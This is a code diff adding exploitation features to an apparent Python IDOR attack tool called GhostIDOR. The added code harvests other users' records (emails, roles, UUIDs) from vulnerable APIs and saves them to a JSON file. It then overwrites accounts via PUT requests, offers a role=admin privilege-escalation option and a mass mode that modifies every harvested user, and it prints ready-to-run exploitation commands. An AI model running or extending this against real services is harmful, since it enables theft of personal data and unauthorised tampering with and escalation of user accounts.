@@ -385,11 +385,16 @@ class APIIDORTester:
                     user_data = json.loads(response.text)
                     users.append(user_data)
                     
+                    # Store in database for later exploitation
+                    user_uid = user_data.get('uid', user_data.get('id', uid))
+                    self.user_database[str(user_uid)] = user_data
+                    
                     # Extract role if present
                     role = user_data.get('role', user_data.get('user_role', 'unknown'))
                     email = user_data.get('email', 'N/A')
+                    uuid_short = user_data.get('uuid', 'N/A')[:16] if user_data.get('uuid') else 'N/A'
                     
-                    print(f"  {Colors.CYAN}[{uid}]{Colors.RESET} Role: {role} | Email: {email[:30]}")
+                    print(f"  {Colors.CYAN}[{uid}]{Colors.RESET} Role: {role} | Email: {email[:30]} | UUID: {uuid_short}...")
                     
                     # Track admin roles
                     if 'admin' in str(role).lower():
@@ -810,6 +815,66 @@ class APIIDORTester:
         
         if successful:
             print(f"\n{Colors.RED}[!] Successfully exploited UIDs:{Colors.RESET} {', '.join(str(r['uid']) for r in successful)}")
+    
+
+    def exploit_user_with_uuid(self, api_url: str, target_uid: str, new_data: Dict = None) -> bool:
+        """Exploit a specific user with their correct UUID"""
+        
+        # Get user data from database
+        if target_uid not in self.user_database:
+            print(f"{Colors.RED}[!] User {target_uid} not found in database{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Run enumeration first to discover users{Colors.RESET}")
+            return False
+        
+        user_data = self.user_database[target_uid].copy()
+        
+        print(f"\n{Colors.CYAN}[*] Exploiting user {target_uid}{Colors.RESET}")
+        print(f"  {Colors.CYAN}UUID:{Colors.RESET} {user_data.get('uuid', 'N/A')}")
+        print(f"  {Colors.CYAN}Email:{Colors.RESET} {user_data.get('email', 'N/A')}")
+        print(f"  {Colors.CYAN}Role:{Colors.RESET} {user_data.get('role', 'N/A')}")
+        
+        # Prepare modified data
+        if new_data:
+            user_data.update(new_data)
+        else:
+            # Default: modify 'about' field
+            user_data['about'] = f'EXPLOITED_BY_GHOSTOPS_{int(time.time())}'
+        
+        # Build request URL
+        test_url = self._build_api_url(api_url, 'uid', target_uid)
+        
+        print(f"\n{Colors.YELLOW}[*] Sending PUT request...{Colors.RESET}")
+        
+        try:
+            response = self.session.put(test_url, json=user_data, timeout=10)
+            
+            if response.status_code in [200, 201]:
+                print(f"  {Colors.GREEN}[+] PUT successful: {response.status_code}{Colors.RESET}")
+                
+                # Verify modification
+                verify_resp = self.session.get(test_url, timeout=5)
+                if verify_resp.status_code == 200:
+                    verify_data = json.loads(verify_resp.text)
+                    
+                    # Check if modification worked
+                    if 'EXPLOITED_BY_GHOSTOPS' in str(verify_data.get('about', '')):
+                        print(f"  {Colors.BOLD}{Colors.GREEN}[!] EXPLOITATION SUCCESSFUL!{Colors.RESET}")
+                        print(f"\n{Colors.CYAN}Modified user data:{Colors.RESET}")
+                        for key in ['uid', 'uuid', 'role', 'email', 'full_name', 'about']:
+                            if key in verify_data:
+                                print(f"  {key}: {verify_data[key]}")
+                        return True
+                    else:
+                        print(f"  {Colors.YELLOW}[-] Modification not verified{Colors.RESET}")
+                        return False
+            else:
+                print(f"  {Colors.RED}[-] PUT failed: {response.status_code}{Colors.RESET}")
+                print(f"  {Colors.YELLOW}Response: {response.text[:200]}{Colors.RESET}")
+                return False
+                
+        except Exception as e:
+            print(f"  {Colors.RED}[!] Error: {e}{Colors.RESET}")
+            return False
     
     def run_comprehensive_api_test(self, url: str) -> List[IDORResult]:
         """Run comprehensive API IDOR testing"""
@@ -1517,6 +1582,8 @@ class GhostIDOR:
         self.progress_lock = Lock()
         self.tested_count = 0
         self.found_count = 0
+        self.user_database = {}  # Store uid -> user_data mapping
+        self.extracted_users_file = 'ghostidor_users.json'
         
         self._print_banner()
         
@@ -2465,6 +2532,13 @@ class GhostIDOR:
                         # Check if it's JSON
                         if 'application/json' in response.headers.get('Content-Type', ''):
                             data = json.loads(response.text)
+                            
+                            # Store in user database if it has uid
+                            if 'uid' in data or 'id' in data:
+                                user_uid = str(data.get('uid', data.get('id', payload)))
+                                with self.results_lock:
+                                    self.user_database[user_uid] = data
+                            
                             # Print interesting fields
                             interesting_fields = ['email', 'role', 'full_name', 'about', 'uuid', 'uid']
                             extracted = {k: v for k, v in data.items() if k in interesting_fields}
@@ -2518,6 +2592,123 @@ class GhostIDOR:
                 print(f"\n{Colors.RED}[!] Error testing {payload}: {e}{Colors.RESET}")
             return None
     
+
+    def save_extracted_users(self):
+        """Save extracted user data to JSON file"""
+        if not self.user_database:
+            print(f"{Colors.YELLOW}[!] No users extracted{Colors.RESET}")
+            return
+        
+        output_file = self.extracted_users_file
+        
+        with open(output_file, 'w') as f:
+            json.dump(self.user_database, f, indent=2)
+        
+        print(f"\n{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GREEN}║              USER DATA EXTRACTED AND SAVED                        ║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}Extracted users:{Colors.RESET} {len(self.user_database)}")
+        print(f"{Colors.CYAN}Saved to:{Colors.RESET} {output_file}")
+        
+        # Show summary
+        print(f"\n{Colors.CYAN}User Summary:{Colors.RESET}")
+        for uid, data in sorted(self.user_database.items(), key=lambda x: int(x[0]) if x[0].isdigit() else 0):
+            role = data.get('role', 'unknown')
+            email = data.get('email', 'N/A')
+            uuid_short = data.get('uuid', 'N/A')[:16] if data.get('uuid') else 'N/A'
+            print(f"  [{uid}] {role:15s} {email:30s} UUID: {uuid_short}...")
+        
+        # Generate exploitation commands
+        print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] EXPLOITATION COMMANDS:{Colors.RESET}\n")
+        
+        if self.user_database:
+            first_uid = list(self.user_database.keys())[0]
+            print(f"{Colors.GREEN}# Exploit user {first_uid} with PUT:{Colors.RESET}")
+            print(f"python3 {sys.argv[0]} --exploit-extracted \\")
+            print(f"  -u '{self.args.url.replace('/FUZZ', '')}' \\")
+            print(f"  --target-uid {first_uid}")
+            
+            print(f"\n{Colors.GREEN}# Role escalation attack:{Colors.RESET}")
+            print(f"python3 {sys.argv[0]} --exploit-extracted \\")
+            print(f"  -u '{self.args.url.replace('/FUZZ', '')}' \\")
+            print(f"  --target-uid {first_uid} \\")
+            print(f"  --modify-field 'role=admin'")
+            
+            print(f"\n{Colors.GREEN}# Mass exploitation (all users):{Colors.RESET}")
+            print(f"python3 {sys.argv[0]} --exploit-all \\")
+            print(f"  -u '{self.args.url.replace('/FUZZ', '')}'")
+        
+        print()
+    
+    def load_extracted_users(self):
+        """Load previously extracted user data"""
+        if not os.path.exists(self.extracted_users_file):
+            print(f"{Colors.RED}[!] No extracted users file found: {self.extracted_users_file}{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Run fuzzing first with: -u URL/FUZZ -p FUZZ -w wordlist.txt{Colors.RESET}")
+            return False
+        
+        with open(self.extracted_users_file, 'r') as f:
+            self.user_database = json.load(f)
+        
+        print(f"{Colors.GREEN}[+] Loaded {len(self.user_database)} users from {self.extracted_users_file}{Colors.RESET}")
+        return True
+    
+    def exploit_all_users(self, base_url: str, modify_field: str = None):
+        """Exploit all extracted users"""
+        if not self.user_database:
+            print(f"{Colors.RED}[!] No users loaded{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.BOLD}{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.RED}║              MASS EXPLOITATION MODE                               ║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}[!] This will attempt to modify ALL {len(self.user_database)} users!{Colors.RESET}")
+        
+        try:
+            confirm = input(f"\n{Colors.BOLD}Continue? (yes/no): {Colors.RESET}").strip().lower()
+            if confirm not in ['yes', 'y']:
+                print(f"{Colors.YELLOW}[*] Exploitation cancelled{Colors.RESET}")
+                return
+        except:
+            print(f"\n{Colors.YELLOW}[*] Exploitation cancelled{Colors.RESET}")
+            return
+        
+        print(f"\n{Colors.GREEN}[+] Starting mass exploitation...{Colors.RESET}\n")
+        
+        successful = []
+        failed = []
+        
+        for uid in self.user_database.keys():
+            # Prepare modification
+            new_data = {}
+            if modify_field and '=' in modify_field:
+                field, value = modify_field.split('=', 1)
+                new_data[field] = value
+            
+            # Exploit
+            result = self.exploit_user_with_uuid(base_url, uid, new_data)
+            
+            if result:
+                successful.append(uid)
+            else:
+                failed.append(uid)
+            
+            time.sleep(0.1)  # Small delay
+        
+        # Summary
+        print(f"\n{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GREEN}║              MASS EXPLOITATION COMPLETE                           ║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+        
+        print(f"{Colors.CYAN}Total users:{Colors.RESET} {len(self.user_database)}")
+        print(f"{Colors.GREEN}Successful:{Colors.RESET} {len(successful)}")
+        print(f"{Colors.RED}Failed:{Colors.RESET} {len(failed)}")
+        
+        if successful:
+            print(f"\n{Colors.GREEN}Successfully exploited UIDs:{Colors.RESET} {', '.join(successful)}")
+    
     def run_all_tests(self, url: str) -> List[IDORResult]:
         """Run all IDOR tests on a URL"""
         all_results = []
@@ -2533,8 +2724,13 @@ class GhostIDOR:
             if not self.args.fuzz_param:
                 return all_results
         
-        # Smart Recon Mode
+        # Smart Recon Mode - Enhanced with auto JS analysis and encoding detection
         if self.args.smart_recon:
+            # Auto-enable JS analysis and encoding detection
+            print(f"{Colors.CYAN}[*] Smart Recon enabled - activating all intelligence features{Colors.RESET}\n")
+            self.args.analyze_js = True
+            self.args.detect_encoding = True
+            
             self.smart_recon_result = SmartRecon.analyze_and_exploit(url, self.session, self.args)
             
             if self.smart_recon_result['success']:
@@ -2573,6 +2769,10 @@ class GhostIDOR:
         # Test for encoded references
         if (self.args.detect_encoding or self.args.method == 'POST') and not self.args.fuzz_param:
             all_results.extend(self.test_encoded_references(url))
+        
+        # Save extracted users if we have any
+        if self.user_database and self.args.fuzz_param:
+            self.save_extracted_users()
         
         return all_results
     
@@ -2767,7 +2967,7 @@ def main():
     parser.add_argument('--analyze-js', action='store_true',
                        help='Analyze JavaScript files for IDOR patterns')
     parser.add_argument('--smart-recon', action='store_true',
-                       help='Auto-detect IDOR patterns and exploit')
+                       help='Smart reconnaissance mode (auto-enables JS analysis, encoding detection, and pattern exploitation)')
     parser.add_argument('--api-test', action='store_true',
                        help='Comprehensive API IDOR testing (GET/POST/PUT/DELETE)')
     parser.add_argument('--auto-exploit', action='store_true',
@@ -2776,6 +2976,16 @@ def main():
                        help='Manual API exploitation mode')
     parser.add_argument('--target-uid', type=int,
                        help='Target UID for manual exploitation')
+    parser.add_argument('--exploit-uid', type=str,
+                       help='Exploit specific UID using discovered UUID (safer than --auto-exploit)')
+    parser.add_argument('--modify-field', type=str,
+                       help='Field to modify (default: about). Format: field=value')
+    parser.add_argument('--exploit-extracted', action='store_true',
+                       help='Exploit using previously extracted user data')
+    parser.add_argument('--exploit-all', action='store_true',
+                       help='Exploit ALL extracted users (DANGEROUS!)')
+    parser.add_argument('--users-file', default='ghostidor_users.json',
+                       help='File containing extracted user data (default: ghostidor_users.json)')
     parser.add_argument('--exploit-method', choices=['PUT', 'PATCH', 'DELETE'],
                        help='Exploitation method to use')
     parser.add_argument('--fuzz-range', help='Range for fuzzing (format: 1-100)')
@@ -2811,6 +3021,54 @@ def main():
     
     try:
         scanner = GhostIDOR(args)
+        scanner.extracted_users_file = args.users_file
+        
+        # Handle extracted users exploitation
+        if args.exploit_extracted or args.exploit_all:
+            if not scanner.load_extracted_users():
+                sys.exit(1)
+            
+            if args.exploit_all:
+                # Mass exploitation
+                base_url = args.url.replace('/FUZZ', '')
+                scanner.exploit_all_users(base_url, args.modify_field)
+                sys.exit(0)
+            elif args.target_uid:
+                # Single user exploitation
+                base_url = args.url.replace('/FUZZ', '')
+                new_data = {}
+                if args.modify_field and '=' in args.modify_field:
+                    field, value = args.modify_field.split('=', 1)
+                    new_data[field] = value
+                success = scanner.exploit_user_with_uuid(base_url, str(args.target_uid), new_data)
+                sys.exit(0 if success else 1)
+            else:
+                print(f"{Colors.RED}[!] Specify --target-uid for single exploitation{Colors.RESET}")
+                sys.exit(1)
+        
+        # Handle direct exploitation mode
+        if args.exploit_uid:
+            # First enumerate to get UUIDs
+            print(f"{Colors.BLUE}[*] Enumerating users to discover UUIDs...{Colors.RESET}")
+            api_tester = APIIDORTester(scanner.session, args)
+            users = api_tester.enumerate_users(args.url, max_users=50)
+            
+            # Store in scanner's database
+            for user in users:
+                uid = str(user.get('uid', user.get('id', '')))
+                scanner.user_database[uid] = user
+            
+            # Parse modification if specified
+            new_data = {}
+            if args.modify_field:
+                if '=' in args.modify_field:
+                    field, value = args.modify_field.split('=', 1)
+                    new_data[field] = value
+            
+            # Exploit
+            success = scanner.exploit_user_with_uuid(args.url, args.exploit_uid, new_data)
+            sys.exit(0 if success else 1)
+        
         results = scanner.run_all_tests(args.url)
         scanner.print_report(results)
         
